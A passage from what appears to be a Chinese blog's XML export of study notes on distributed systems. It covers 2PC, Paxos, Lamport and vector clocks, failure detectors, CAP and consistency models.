由于网络原因，一些slave接受了更新，一些slave没有接受到更新，这时候就矛盾了。这里的P/B模式本质上来说就是只在一个master上跟client进行信息交互，然后再由master将信息更新扩散到其他slave节点上，好处在于，这时候不用考虑时钟一致性什么的，因为这时候系统上流传的信息都来自于同一台master，因此操作一定是按照某种可以预测的顺序进行的。坏处就太明显了，在网络环境无法保证畅通的情况，master存在着大大的失联风险，因此也给系统带来非常大的不确定性。系统的不确定性有多种可能，主机挂了，一部分从机挂了，或者两者都挂了；并且挂的时机不同，挂的顺序不同，还会造成不同的错误，所以，为了进一步提高网络的健壮性，我们可以考虑2PC。 Two phase commit (2PC)2PC相比较于Primary/backup的1PC，其多出来的一步提供了可以回滚操作的能力。 Note：2PC assumes that the data in stable storage at each node is never lost and that no node crashes forever. Data loss is still possible if the data in the stable storage is corrupted in a crash 2PA分为两步，第一步master给N个slave节点（N是slave节点的数量）发送更改的信息，slave节点接收到更新信息后，将相应的更改储存在临时的地方，并且返回一个表示“我ok“的信号，master收到N个”我ok“的信号后，会再次发送N个”走你“的信号，slave节点接收到”走你“的信号后，就真正把临时更改写入到内存中。一次2PC要进行3N个信息交互。2PC很容易阻塞，因为如果一台slave挂了，master需要等待这个slave重启并且发送”我ok“信号（这里假设崩溃的主机会自动恢复）。2PC基于的假设是数据存储是可靠的，节点不会永久故障，因此一旦这些假设不满足，数据还是有可能丢失的。在前一章CAP理论中，我们讲过2PC是一个CA系统，其考虑的失败模型中没有考虑network partitions，一旦发送网络分区，只能终止服务，人工接入，因此现在的系统一般都会考虑使用a partition tolerant consensus algorithm，这能够很好的处理网络分区。 Partition tolerant consensus algorithms分区容忍的算法比较有名的就是Paxos和Raft，在具体看算法之前，我们先回答第一个问题：What is a network partition?什么是网络分区 A network partition is the failure of a network link to one or several nodes. The nodes themselves continue to stay active, and they may even be able to receive requests from clients on their side of the network partition 这里的network patition可以看成是两个节点相互失去连接。事实上，当两台节点相隔非常远的时候，我们很难确定失联是因为对面的节点挂了还是网络延时造成的，所以不妨把两个节点失联的情况统一看成是网络分区，网络分区的意思是两个节点处于两个不同的网络之中，无法进行交互，因为可能会出现信息冲突的情况。网络分区的一个特点是我们很难网络分区和节点故障区分开，一旦网络分区发生，系统中就会有多个部分都是出于active的状态，在Primary/backup中就会出现两个primary。因此，Partition tolerant consensus algorithms必须要解决的一个问题就是：during a network partition, only one partition of the system remains active 解决的方法主要有： Majority decisions：在N个节点中，只有有N/2+1个还正常就能正常工作 Roles：有两种思路（all nodes may have the same responsibilities, or nodes may have separate, distinct roles.）通过选出一个master，能使系统变得更有效，最简单的好处就是：操作都经过master，就使得所有的操作都强制排序了。 Epochs：Epochs作用类似于逻辑时钟，能够使得不同节点对当前系统状态有个统一的认知 除了上面给出的方法外，还需要注意： practical optimizations: avoiding repeated leader election via leadership leases (rather than heartbeats)【防止重复leader选举，手段是通过租期而不是心跳】 avoiding repeated propose messages when in a stable state where the leader identity does not change【防止重复propose消息】 ensuring that followers and proposers do not lose items in stable storage and that results stored in stable storage are not subtly corrupted (e.g. disk corruption)【对于items要持久化存储防止丢失】 enabling cluster membership to change in a safe manner (e.g. base Paxos depends on the fact that majorities always intersect in one node, which does not hold if the membership can change arbitrarily) procedures for bringing a new replica up to date in a safe and eﬃcient manner after a crash, disk loss or when a new node is provisioned procedures for snapshotting and garbage collecting the data required to guarantee safety after some reasonable period (e.g. balancing storage requirements and fault tolerance requirements) Paxospaxos协议是分布式研究史上一朵璀璨的仙葩，一个现代各种分布式架构的基石，一种出了名的难以读懂的算法（基础是很好懂的，然而具体到工程领域就非常复杂了）。由于应用场景不同，paxos出现了很多变体，虽然2013年有大牛提出了更易于教学的raft，但是在很多领域，还是得用回复杂难懂但是有用的paxos协议（或其变体）。Paxos用于解决分布式系统中一致性问题。分布式一致性算法（Consensus Algorithm）是一个分布式计算领域的基础性问题，其最基本的功能是为了在多个进程之间对某个（某些）值达成一致（强一致）；简单来说就是确定一个值，一旦被写入就不可改变。paxos用来实现多节点写入来完成一件事情，例如mysql主从也是一种方案，但这种方案有个致命的缺陷，如果主库挂了会直接影响业务，导致业务不可写，从而影响整个系统的高可用性。paxos协议是只是一个协议，不是具体的一套解决方案。目的是解决多节点写入问题。paxos协议用来解决的问题可以用一句话来简化： 将所有节点都写入同一个值，且被写入后不再更改。 paxos的基本概念： 两个操作： Proposal Value：提议的值；【可以理解为某个节点将干的事情，比如说将变量name修改为handsome】 Proposal Number：提议编号，可理解为提议版本号，要求不能冲突；【提议编号用于后续比较，比如说，我怎么知道哪个提议比较新？通过给每个提议加上一个编号就行了，这样接收到不同提议的节点就可以判断出1、它该不该接受这些提议（如果接收到的提议号都小于本地收藏的提议编号，就不接收）2、该接受哪个（接受比本地编号大的最大的那个提议，但是接受提议编号，不代表接受提议的值，具体看后面） 三个角色 Proposer：提议发起者。Proposer 可以有多个，Proposer 提出议案（value）。所谓 value，可以是任何操作，比如“设置某个变量的值为value”。不同的 Proposer 可以提出不同的 value，例如某个Proposer 提议“将变量 X 设置为 1”，另一个 Proposer 提议“将变量 X 设置为 2”，但对同一轮 Paxos过程，最多只有一个 value 被批准。 Acceptor：提议接受者；Acceptor 有 N 个，Proposer 提出的 value 必须获得超过半数(N/2+1)的 Acceptor批准后才能通过。Acceptor 之间完全对等独立。 Learner：提议学习者。上面提到只要超过半数accpetor通过即可获得通过，那么learner角色的目的就是把通过的确定性取值同步给其他未确定的Acceptor。proposer可以看成是接受了某个client的请求，然后将client的请求广播到其他节点，要求其他节点做出同样更新的节点a。acceptor就是那些应节点a要求进行更新的节点。learner的作用是将最后分布式系统达成的提议（因为可能同时存在多个提议（也就是说有多个信息需要修改，或者说有一个变量值在同一时刻收到了来自不同client的更改请求），所以需要通过竞争来确定一个提议）广播到所有的节点上。 paxos的原则： 安全原则—保证不能做错的事 针对某个实例的表决只能有一个值被批准，不能出现一个被批准的值被另一个值覆盖的情况；(假设有一个值被多数Acceptor批准了，那么这个值就只能被学习) 每个节点只能学习到已经被批准的值，不能学习没有被批准的值。 存活原则—只要有多数服务器存活并且彼此间可以通信，最终都要做到的下列事情： 最终会批准某个被提议的值； 一个值被批准了，其他服务器最终会学习到这个值。 paxos的流程：一开始，所有acceptor的本地编号都是0，本地接受的更改是null（接受的更改对应于proposal value）。 1、准备阶段： 第一阶段A：proposer选择一个提议编号n，向所有acceptor广播编号为n，更改为v的提议。 第一阶段B：接收到提议编号n的节点（由于网络原因，不是所有节点都能接收到编号为n的提议），将n与自己本身保存的编号curN比较，此时又细分为两种情况： 节点本身并没有接受任何更改，还是null，那么如果n&gt;=curN，那么就将curN改成N，并且返回”我ok”；如果n&lt;curN，就返回curN和“我不ok” 节点本身已经接受了某个更改v，那么，如果n&gt;curN，那么返回当前更改v，和当前编号curN,然后再将curN改成n，注意了，这里并没有接受编号n的提议值，而是返回本节点已经接受了的提议值；如果n=curN，那么就将本地的提议值改成接收到的提议值，并且返回”ok了“；如果n&lt;curN，那还是什么都不做。 2、接受阶段： 第二阶段A：proposer得到了来自acceptor的回应 如果未超过半数acceptor响应，直接转为提议失败 如果超过半数(N/2+1)acceptor响应，则进一步判断： 1、如果所有accptor都未接受过值（都是null），那么向所有的acceptor发起自己的提议编号n和提议值v。**注意，是所有接收到的acceptor的回应都是null，此时不代表其他没响应的acceptor是null” 2、如果有部分acceptor接受过值，那么从所有接受过的值中选择对应提议编号最大的值作为自己的提议值，提议编号仍未n，但此时proposer不能提议自己的值，而是使用acceptor中提议编号最大的值。 第二阶段B：Acceptor接收到提议后，如果该提议编号不等于自身保存记录的编号，则不会更改本地的提议值，若是提议编号大于自己保存的编号，则更新自己的编号（不会更新自己的提议值），并返回自己现有的提议值；编号相等则写入本地。 paxos提议编号ID生成的算法：在Google的Chubby论文中给出了这样一种方法：假设有n个proposer，每个编号为ir(0&lt;=ir&lt;n)，proposal编号的任何值s都应该大于它已知的最大值，并且满足： s %n = ir =&gt; s = m*n + ir proposer已知的最大值来自两部分：proposer自己对编号自增后的值和接收到acceptor的拒绝后所得到的值。例： 以3个proposer P1、P2、P3为例，开始m=0,编号分别为0，1，2。1） P1提交的时候发现了P2已经提交，P2编号为1 &gt;P1的0，因此P1重新计算编号：new P1 = 1*3+1 = 4；2） P3以编号2提交，发现小于P1的4，因此P3重新编号：new P3 = 1*3+2 = 5。 活锁当某一proposer提交的proposal被拒绝时，可能是因为acceptor 承诺返回了更大编号的proposal，因此proposer提高编号继续提交。如果2个proposer都发现自己的编号过低转而提出更高编号的proposal，会导致死循环，这种情况也称为活锁。比如说当此时的 proposer1提案是3, proposer2提案是4, 但acceptor承诺的编号是5，那么此时proposer1,proposer2都将提高编号假设分别为6,7，并试图与accceptor连接，假设7被接受了，那么提案5和提案6就要重新编号提交，从而不断死循环。 例子具体例子看这里 总结：本章作者主要介绍了保证strong consistency的各种算法，以比较同步和异步复制开始，然后逐渐讨论随着考虑的错误变多算法需要怎么调整，下面是算法的一些关键点总结 Primary/Backup Single, static master Replicated log, slaves are not involved in executing operations No bounds on replication delay Not partition tolerant Manual/ad-hoc failover, not fault tolerant, “hot backup” 2PC Unanimous vote: commit or abort Static master 2PC cannot survive simultaneous failure of the coordinator and a node during a commit Not partition tolerant, tail latency sensitive Paxos Majority vote Dynamic master Robust to n/2-1 simultaneous failures as part of protocol Less sensitive to tail latency]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式入门篇（三）]]></title>
    <url>%2F2019%2F03%2F06%2Fchapter3%2F</url>
    <content type="text"><![CDATA[Time and order author:sworduo date:Feb 27, Wed, 2019 参考:袖珍分布式系统（三） 首先来看文章提出的第一个问题： what is order and why is is important? order可以说是贯穿整个分布式系统的一个基石问题，之前说到，一致性问题是其他高阶算法的基础，同样的，这里的order问题则是一致性问题的基础。还记得分布式系统设计的初衷是什么吗？ the art of solving the same problem that you can solve on a single computer using multiple computers. 我们希望用分布式算法统筹的多机系统表现得和单机系统一样，这就引出了一个非常重要的问题：order。 order的重要性如果多个节点有了一个统一的order，那么我们可以很方便的给不同节点上的任务标定一个适用于全局的标记，有了这个全局有效的标记，就能控制任务按照我们预设的顺序执行，这样一来多机就真的和单机没什么区别了。这个时候可以很方便的把大部分单机上执行的程序移植到多机系统上，然而这是一个美好的幻想。 实现order的难点我们可以很轻易的在单机上控制任务执行的次序，只要按照任务进来的顺序给定相应的编号，那么我们就能控制任务执行的顺序，甚至能预测任务完成的时间等等。然而同样的问题扩大到分布式系统时就变得十分棘手，因为程序实际的执行顺序你是无法预测的。因为物理等其他原因，每个节点的时钟并不是完全一致的，这种微小偏差对于人类来说几乎可以忽略不计，但是对于ms甚至是ps精度的计算机而言，一点细小的偏差将会导致非常大的错误，日积月累下来将会影响整个系统的运行。解决节点之间的同步有两种思路： 使用复杂的容错的技术来实现所有节点的时钟同步，然后根据时间戳生成全局有效的先后标识作为任务执行的凭证，从而得到一个全局的total order。这个思路的难点在于，如何在地里位置相隔甚远的情况下，实现一个多机共享的，ms、微秒甚至ps是误差精度的时钟。 通过communication system，给每个操作编号，从而得到一个顺序。然而这个思路的难点在于，分布式系统中网络通信是不可靠的，您不可能完全确定另一个节点的状态。 Total and partial order在分布式环境中一种常见的状态是partial order。其含义是集合中的任意两个元素不一定可以进行比较。比如说假设A比B高，A也比C高，然而你无法通过比较来确定B和C谁高。针对分布式系统的场景，因为时钟很难真正达到一致，所以分布式网络中每个节点都有其局部时间，所以，假如节点A同时受到节点B和C的消息时，A很难确定B和C的消息究竟谁快谁慢，有可能因为误差累积的原因，B的记录时间大于C，然而实际时间却是小于C，这种情况下，时间的先后只能在单机上比较。那么我们能否在分布式网络中实现一个total order，使得不同节点共享同一个准确的次序呢，很难，因为： communication is expensive, and time synchronization is diﬃcult and fragile Time从前面的讲述中，其实我们可以意识到，次序是和时间紧密相连的，在单机系统中，因为只存在一个时间，所以次序可以用时间的大小的来进行表示和比较。那么，什么是时间？ Time is a source of order - it allows us to deﬁne the order of operations- which coincidentally also has an interpretation that people can understand (a second, a minute, a day and so on). 时间有时候就像一个计数器，只不过时间这个计数器比较重要，我们用这个计数器产生的数值来定义整个人类的最重要的概念：时间。 Timestamps really are a shorthand value for representing the state of the world from the start of the universe to the current moment - if something occurred at a particular timestamp, then it was potentially inﬂuenced by everything that happened before it. 什么是时间戳（Timestamps），Timestamps定义了世界从初始到现在的状态，如果某件事发生在一个特定的时间点上，是之前影响产生的结果。时间戳的概念可以泛化到因果时钟上，因果时钟认为此时此刻发生的事情和之前发生的事情存在因果关系，所以可以通过当前时刻逆推出之前时刻和此刻有关系的事件，而不仅仅是简单的认为之前发生的所有事情都和此时的事情有关。这个概念基于的前提是：所有的时间都以相同的速率前行着，time and timestampes在程序中应用时，通常有三个解释： order duration interpretation前面提到的”time is a source of order”的含义是： we can attach timestamps to unordered events to order them【通过给事件安排一个时间戳，从而给事件排序】 we can use timestamps to enforce a speciﬁc ordering of operations or the delivery of messages (for example, by delaying an operation if it arrives out of order)【我们可以通过时间戳给操作重新排序】 we can use the value of a timestamp to determine whether something happened chronologically before something else【通过时间戳知道哪个事件发生在前】 Interpretation - time as a universally comparable value.时间戳的绝对值解释为日期（date），这是人们非常容易理解并且加以运用的概念。Duration - durations measured in time have some relation to the real world.像算法一般只关心duration，通过duration来判断延迟，一个好的算法都希望能有低延时。 Does time progress at the same rate everywhere?分布式网络中，各个节点的时间可以以同样的速率前进吗？有三个常见的回答： “Global clock”: yes “Local clock”: no, but “No clock”: no!以上三种看待时间的角度和之前提到的三种系统模型息息相关： the synchronous system model has a global clock, the partially synchronous model has a local clock, and in the asynchronous system model one cannot use clocks at all下面逐一来解释： Time with a “global-clock” assumption 当我们认可全局时钟的概念时，等同于我们接受分布式网络各个节点共享同一个非常精确的，几乎没有偏差的时钟的假设，我们从任何时刻任何节点所看到的时间应该基本等同于其他地方其他节点此时此刻的时间，这也是平时生活中我们习以为常的时钟，同样的，正如上面提到一样，我们可以以较大的偏差来接受这个时钟，而分布式网络则以非常严苛的偏差来接受这个时钟。有了global-clock，那么我们可以通过timestamp来生成一个total order，一定程度上可以把此时的分布式系统看成是单机网络，然而维持较大范围内的时钟同步是一件非常困难的事情，我们只能做到一定范围内的同步。（我觉得一般当问题有两种解决思路时，最佳的解决方法就是两种都用，比如小范围内用时钟同步，大范围内用后面提到的vector clock方法，这样可能效果是最好的，没验证，只是章口就莱。）目前，忽略时钟不同步问题做出来的系统有： Facebook’s Cassandra:通过时间戳来解决冲突。 Google’s Spanner:时间戳+偏差范围来定义顺序。 Time with a “Local-cloak” assumption events on each system are ordered but events cannot be ordered across systems by only using a clock.此时每个节点有各自的时间，因而节点内部的任务可以通过时间戳来排序，但是不同节点上的时间戳不能比较。 Time with a “No-clock” assumption不在使用时间戳，而是使用counter，通过传递消息来交换counter，从而定义不同机器之间的事件的前后顺序，由于没有时钟的存在，所以无法设定超时等概念。比较有名的论文就是：time, clocks and the ordering of events。 How is time used in a distributed system?时间的好处是： Time can deﬁne order across a system (without communication)【时间可以不通过通信而在整个分布式网络中维持一个统一的时钟】 Time can deﬁne boundary conditions for algorithms【可以定义一些边界条件，比如失败的条件等等】在分布式系统中，定义时间的顺序非常重要，因为： where correctness depends on (agreement on) correct event ordering, for example serializability in a distributed database【正确性依赖于事件的顺序】 order can be used as a tie breaker when resource contention occurs, for example if there are two orders for a widget, fulﬁll the ﬁrst and cancel the second one【当发生资源争用的时候可以用来做裁决】如果我们有全局时钟，就可以不通过通信来确定事物的顺序了，不幸的是，我们一般没有，所以只能通过通信来确定顺序。此外，时间还可以用来区分high latency和server or network link is down.而区分两者的算法就是failure detectors. Vector clocks(time for causal order)时间之所以重要，是因为我们需要时间来确定事物发生的顺序，然而，我们真正想要的自始至终都是顺序，而不是时间，那么，我们能不能以其他设计为基础来定义事物的顺序呢？还真是有，Lamport clocks和vector clocks是两种替代物理时钟的方法。这两种方法的核心都在于维护一个本地的计数器，然后通过通信来更新计数器，以此来为本地的任务进行标记，而这种标记是可以在全局进行比较的。 Lamport clockLamport clock里每个节点只维护自身的计数器，其更新规则： Whenever a process does work, increment the counter【工作时计数器加一】 Whenever a process sends a message, include the counter【发送信息时，附上当前记数器额值】 When a message is received, set the counter to max(local_counter, received_counter) + 1【接收到信息时，更新自身的计数器】然而这种方法有些缺点。比如，两件任务同时在A和B上独立运行，这时候他们之间就很难判断优先级了。再比如A同时收到B和C的信息，若B只与A交互，而C与成百上千台机器交互，那么C的数值将会非常大，这时候如果B和C的任务同时到来，那么A基本上只会执行C的任务，而不会去执行B的任务，即便可能B的任务更加新，然而由于其计数器非常小而可能被认为是旧的任务。（这里我也不是很懂，也是章口就莱） Vector clockvector clock里每个节点维护和它直接通信过的、或者是它知道的其他节点的计数值，比如A知道BCD，那么A和E第一次通信之后，E不仅知道了和它直接通信的A，还知道了A已知的BCD。其更新规则如下： Whenever a process does work, increment the logical clock value of the node in the vector【只更新自己的值】 Whenever a process sends a message, include the full vector of logical clocks【发送整个向量】 When a message is received: update each element in the vector to be max(local, received) increment the logical clock value representing the current node in the vector Failure detectors(time for cutoff)在分布式环境中，我们怎么知道一个节点已经不可用了呢？我们可以等待一段时间，如果这段时间超过预设的时间阈值，那么就认为对面宕机了。那么，这个时间阈值应该怎么设置？首先这不应该是一个固定的值，因为网络环境和节点之间的延迟千变万化。所以阈值的选择非常灵活。 A failure detector is a way to abstract away the exact timing assumptions. Failure detectors are implemented using heartbeat messages and timers. Processes exchange heartbeat messages. If a message response is not received before the timeout occurs, then the process suspects the other process. failure detectors有两个重要的属性，每个属性又有两个衍生的概念： Strong completeness:Every crashed process is eventually suspected by every correct process. Weak completeness:Every crashed process is eventually suspected by some correct process. Strong accuracy:No correct process is suspected ever. Weak accuracy:Some correct process is never suspected.可以很方便的基于weak completeness来实现strong completeness，只要利用广播就行，所以一般而言，分布式编程的重点在于accuracy.failure detectors是一个非常重要的工具，有了它，我们可以判断一个远程节点是出于高延时状态还是宕机状态。宕机状态的远程节点我们可以不再关注，但是，若远程主机仅仅是处于高延迟状态，那么我们就必须同步，或者是做一些设计中应该要做的事情。]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式入门篇（二）]]></title>
    <url>%2F2019%2F03%2F06%2Fchapter2%2F</url>
    <content type="text"><![CDATA[分布式编程主要是解决由于分布式而带来的一系列问题。我们希望把分布式系统看成是具有超大规模处理能力的单机系统，然而这种高层次的抽象会失去许多底层的细节，虽然便于理解，但是加大了编程的难度。所以分布式的抽象主要是在“实现”和“理解”之间取得一个平衡。抽象层次越高，理解起来越简单，实现起来越困难，事实上，这是一个贯穿于整个计算机系统各个子领域的权衡问题，没有通用的最优解，只有针对具体的合适的解决方法。我们的目标旨在寻找到一个足够好的抽象模型，尽可能让编程变得简单的同时容易让人可以理解。 Up and down the level of abstraction author:Sworduo date:Feb 26, Tue, 2019 参考1:袖珍分布式系统（二）参考2:CAP定理的含义 我们上面说要在“实现”和“理解”之间寻找到一个合适的抽象，那如何定义什么是合适的抽象？ What do we mean when say X is more abstract than Y? First, that X does not introduce anything new or fundamentally diﬀerent from Y. In fact, X may remove some aspects of Y or present them in a way that makes them more manageable. Second, that X is in some sense easier to grasp than Y, assuming that the things that X removed from Y are not important to the matter at hand. 简单来说，就是用尽可能少的假设来描述清楚一个东西。你用的假设越少，你基于这个假设所涉及的系统普适性更高，能处理的场景也就越多，然而随之而来的，就是编程难度的提高。抽象能帮助我们从纷繁复杂的细节中提炼出问题的关键，当我们找到问题的症结时，就能设计出相应的解决方案，所以很多时候难点并不在于解决困难，而是发现问题，甚至是意识到原来这是一个问题。 这同样引出一个问题，描述清楚一个东西所需要的最少假设是多少？最简单的方法是列出所有可能的假设，然后一样一样的排除，思考当我排除掉这个假设时，剩余的假设能否清楚的描述一个东西？如果能，就舍去这个假设，如果不能，就留下这个假设。然而“最少的假设”本身就是不存在的，针对每个问题都有不同的“最少假设”，甚至针对不同时期的同一个问题，随着产品的扩大，其所需要的“最小假设”也是不断变化的，前期被舍去的假设后面可能要被重新引入，这是一个动态变化的过程。然而不管怎样变化，核心要义还是用最少的假设去完成我们想要的功能。针对分布式，根据能保证系统正常运行的同时，所需要的最少假设所演化出来的设计就是我们常说的系统模型。 A system model分布式系统最大的属性就是分布式，一个分布式系统中的程序至少需要含有以下这些特点： run concurrently on independent nodes【任务可以在各个独立节点上并发执行】 are connected by a network that may introduce nondeterminism and message loss【节点之间通过网络互连，这可能会造成信息丢失和不确定性】 and have no shared memory or shared clock【不共享内存和时钟】具体的解释是： each node executes a program concurrently【每个节点都并发执行】 knowledge is local: nodes have fast access only to their local state, and any information about global state is potentially out of date 【每个节点只知道自己节点上的信息】 nodes can fail and recover from failure independently 【每个节点失败和恢复都是独立的】 messages can be delayed or lost (independent of node failure; it is not easy to distinguish network failure and node failure) 【通信是不可靠的】 and clocks are not synchronized across nodes (local timestamps do not correspond to the global real time order, which cannot be easily observed)【时钟不同步】系统模型的定义： System model：a set of assumptions about the environment and facilities on which a distributed system is implemented 简单的说，系统模式就是实现分布式系统的环境和工具所依赖的一系列假设。系统模型中还定义了关于environment and facilities的假设，这些假设包括： what capabilities the nodes have and how they may fail 【每个节点能力和失败方式】 how communication links operate and how they may fail and 【节点间通信方式和失败方式】 properties of the overall system, such as assumptions about time and order【整个系统属性：如时序】健壮系统：基于最少的假设来设计的系统，系统在于普适性强，缺点在于难以理解。下面具体介绍nodes的属性以及links and time and order。 Nodes in our system model节点需要提供计算和存储能力，其拥有以下这些特点： the ability to execute a program【执行程序】 the ability to store data into volatile memory (which can be lost upon failure) and into stable state (which can be read after a failure)【在不稳定的内存中存储信息的能力，以及恢复正常的能力】 a clock (which may or may not be assumed to be accurate)【时钟】有许多可能的failure model，一种是crash-recovery failure model，指的是系统只能因为崩溃而拒绝提供服务，并且能在崩溃后自动恢复。另一种是Byzantine fault tolerance，这是现实生活中几乎不会遇到的模型，因为其允许出现随机的错误，显然这种系统非常作，很难伺候。 Communication links in our system model分布式系统中最难处理的假设就是通信假设，我们在分布式系统中，一个系统很难知道另一个系统的情况，因为任何的通信都是不可靠的，信息都无法交流，还怎么知道别人的情况，因此分布式系统中，能依赖的只有节点本身的信息。 Timing / ordering assumptions在分布式系统中我们必须认识到：每个node看到的世界都是不同的，这个不同来自于一个事实：信息的传输需要时间。对于同一件事情，每个节点看到这个事情的时间都是不一样的，因此每个节点看到的世界，其时间点都是不同的。有两个关于时间的主要的模型： Synchronous system: model Processes execute in lock-step; there is a known upper bound on message transmission delay; each process has an accurate clock Asynchronous system:model No timing assumptions - e.g. processes execute at independent rates; there is no bound on message transmission delay; useful clocks do not exist The consensus problem下面对网络是否分区包含在错误模型中和网络传输是同步还是异步模型两个条件的讨论 whether or not network partitions are included in the failure model, and【网络分区是否考虑在模型中】 synchronous vs. asynchronous timing assumptions【同/异步】首先介绍一下什么是一致性模型： Agreement: Every correct process must agree on the same value.【节点内容一致】 Integrity: Every correct process decides at most one value, and if it decides some value, then it must have been proposed by some process.【不太懂说啥，意思可能是值和机器直接有对应关系】 Termination: All processes eventually reach a decision.【所有节点最终会达成一致】 Validity: If all correct processes propose the same value V, then all correct processes decide V.【所有节点观点一致时，其所作出的决定就是有效的】一致性问题是分布式系统里最核心的问题，解决了这个问题，我们就不用关注各个节点数据之间可能出现的不一致和分歧，这也是解决后续许多高级问题的基石。 Two impossibility results什么是impossibility results: A proof of impossibility, also known as negative proof, proof of an impossibility theorem, or negative result, is a proof demonstrating that a particular problem cannot be solved, or cannot be solved in general. Often proofs of impossibility have put to rest decades or centuries of work attempting to find a solution. To prove that something is impossible is usually much harder than the opposite task; it is necessary to develop a theory. Impossibility theorems are usually expressible as universal propositions in logic (see universal quantification). 当确定了不可能结果之后，我们就不用再在这个方向上白费力气，这也是一种排除法，可以指导我们解决问题的方向。在分布式系统中存在两个最重要的不能结果，FLP和CAP,FLP主要用于学术研究，这里不讲，下面着重介绍CAP。 The CAP theoremCAP的含义： Consistency: all nodes see the same data at the same time.（一致性） Availability: node failures do not prevent survivors from continuing to operate.（可用性） Partition tolerance: the system continues to operate despite message loss due to network and/or node failure（分区容忍性）具体来说，分区容错的意思是，区间通信可能会失败，比如一台机器在中国，一台机器在美国，他们之间可能无法通信，实际编程时需要考虑到两台机器之间无法通信/通信失败的情况。一致性是指某台机器将某个对象的值修改后，其他人在其他机器再次访问同一个对象时，都应该看到新值而不是旧值。可用性是指只要收到用户的请求，服务器就必须返回。 一致性和可用性的矛盾：一致性和可用性很难同时成立，因为存在通信失败的可能。假如有两台机器A和B，当你在A修改了对象C的值，这时候如果强调一致性，那么A机器需要锁定B机器的读和写，在B将对象C的值修改之前，B机器不能进行任何其他的读和写，若在这期间有用户对服务器发出对对象C的请求，将不会得到任何答复，这样可用性的不满足了。若要满足可用性，那么B机器的读写就不能被锁定，这样由于延时等原因，一致性就不能满足了，所以二者不可兼得。 事实上，CAP三个特性只有2个能同时满足，因此会出现3种系统： CA (consistency + availability). Examples include full strict quorum protocols, such as two-phase commit. CP (consistency + partition tolerance). Examples include majority quorum protocols in which minority partitions are unavailable such as Paxos. AP (availability + partition tolerance). Examples include protocols using conﬂict resolution, such as Dynamo.CA和CP系统都提供了强一致性模型，不同是CA不可以容忍网络分区，而CP在2f+1个节点中，可以容忍f个节点失败，原因很简单： A CA system does not distinguish between node failures and network failures, and hence must stop accepting writes everywhere to avoid introducing divergence (multiple copies). It cannot tell whether a remote node is down, or whether just the network connection is down: so the only safe thing is to stop accepting writes.【不能区分网络分区和节点失败，因此必须停止写入避免引入不一致】 A CP system prevents divergence (e.g. maintains single-copy consistency) by forcing asymmetric behavior on the two sides of the partition. It only keeps the majority partition around, and requires the minority partition to become unavailable (e.g. stop accepting writes), which retains a degree of availability (the majority partition) and still ensures single-copy consistency.【即使网络分区了，大多数节点的一方还是能够提供服务】CP系统因为将网络分区考虑到了failure model中，因此能够通过类似Paxos, Raft 的协议来区分a majority partition and a minority partitionCA则由于没有考虑网络分区的情况，因此无法知道一个节点不响应式因为节点收不到消息还是节点失败了，因此只能够通过停止服务来防止出现数据一致，在CA中由于不能保证网络可靠性，因此通过使用two-phase commit algorithm来保证数据一致性。从CAP理论中，我们可以得到4个结论： First, that many system designs used in early distributed relational database systems did not take into account partition tolerance (e.g. they were CA designs). Partition tolerance is an important property for modern systems, since network partitions become much more likely if the system is geographically distributed (as many large systems are).【早期系统大多没有考虑P，因此是CA系统，但是现代系统，特别是出现异地多主后，必须考虑分区了】 Second, that there is a tension between strong consistency and high availability during network partitions. The CAP theorem is an illustration of the tradeoﬀs that occur between strong guarantees and distributed computation.【P既然无法避免，我们只能在C和A之间做选择，有时候我们可以通过降低数据的一致性模型，不再追求强一致，从而达到”CAP”】 Third, that there is a tension between strong consistency and performance in normal operation.【当一个操作涉及的消息数和节点的数少的时候，延迟自然就低，但是这也意味着有些节点不会被经常访问，意味着数据会是旧数据】 Fourth - and somewhat indirectly - that if we do not want to give up availability during a network partition, then we need to explore whether consistency models other than strong consistency are workable for our purposes.【有时候3选2可能是误解，我们如果将自己不限制在强一致性模型，我们会有更多的选择】一致性并不是一个一成不变的定义，根据具体场景不同，可以设计出不同的“一致性”。我们要记住： ACID consistency != CAP consistency != Oatmeal consistency 一致性模型的概念是： Consistency model:a contract between programmer and system, wherein the system guarantees that if the programmer follows some speciﬁc rules, the results of operations on the data store will be predictable 一致性模型是编程者和系统之间的契约，只要编程者按照某种规则，那计算机的操作结果就是可预测的。下面介绍一些一致性模型： Strong consistency vs. other consistency models Strong consistency models (capable of maintaining a single copy) Linearizable consistency Sequential consistency Weak consistency models (not strong) Client-centric consistency models Causal consistency: strongest model available Eventual consistency models一致性模型可以分为两大类：强一致和弱一致。强一致模型给编程者提供的是一个和单机系统一样的模型，而弱一致，则让编程者清楚的意识要是在分布式环境下编程，而不是单机环境。 Strong consistency models强一致性模型可以再细分为两大类： Linearizable consistency: Under linearizable consistency, all operations appear to have executed atomically in an order that is consistent with the global real-time ordering of operations. (Herlihy &amp; Wing, 1991) Sequential consistency: Under sequential consistency, all operations appear to have executed atomically in some order that is consistent with the order seen at individual nodes and that is equal at all nodes. (Lamport, 1979)两者的最大不同是：linearizable consistency要求操作的结果要和操作实际执行的顺序一致，而Sequential consistency则允许操作实际发生的顺序和操作产生结果的顺序不同，只要每个节点看到的顺序是一样的就行。两者之间的差别基本上可以忽略。 Client-centric consistency models该一致性模型主要是为了解决下面的情况：客户端进行了某个操作，同时也看到了最新的结果，但是由于网络中断，重新连接到server，此时不能因为重新连接而看到一个旧的结果。 Eventual consistency最终一致性我们需要知道两点： First, how long is “eventually”? It would be useful to have a strict lower bound, or at least some idea of how long it typically takes for the system to converge to the same value【最终一致，这个最终是多久？我们需要有个下限，或者至少是一个平均值】 Second, how do the replicas agree on a value? 【多个副本怎么达成一致？】因此，在谈论最终一致的时候，我们需要知道这可能是：”eventually last-writer-wins, and read-the-latest-observed-value in the meantime”]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式入门篇（一）]]></title>
    <url>%2F2019%2F03%2F06%2Fchapter1%2F</url>
